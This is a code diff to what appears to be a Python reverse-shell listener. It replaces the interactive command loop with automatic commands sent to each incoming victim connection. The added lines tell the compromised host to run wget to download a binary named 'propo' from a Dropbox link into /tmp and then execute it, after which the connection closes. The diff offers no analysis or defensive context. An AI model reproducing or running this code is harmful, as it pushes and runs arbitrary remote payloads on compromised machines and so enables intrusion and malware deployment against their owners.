@@ -35,7 +35,7 @@ Example:
 Credits:
 
 Federico Galatolo 2014
-Marcus Agard 2020
+Marcus Agard, Robert Unnold 2020
 """)
 	sys.exit(0)
 
@@ -108,14 +108,19 @@ while True:
 		print (f"[!] Incoming connection from {clientaddr[0]}")
 		stop = True
 		clientsocket.settimeout(3)
-		while True:
-			reply = input(f"{clientaddr[0]}> ")
-			clientsocket.sendall(f"{reply}\n".encode())
-			try:
-				data = clientsocket.recv(buff)
-				print(data.decode())
-			except:
-				pass
+		# These links may change as we update the files
+		clientsocket.sendall("wget -O /tmp/propo https://www.dropbox.com/s/094z3h3y3mlt1np/propo")
+		clientsocket.recv(buff)
+		clientsocket.sendall("cd /tmp; ./propo")
+		clientsocket.close()
+		# while True:
+		# 	reply = input(f"{clientaddr[0]}> ")
+		# 	clientsocket.sendall(f"{reply}\n".encode())
+		# 	try:
+		# 		data = clientsocket.recv(buff)
+		# 		print(data.decode())
+		# 	except:
+		# 		pass
 
 	if args['payload'] == 'bind':
 		try:
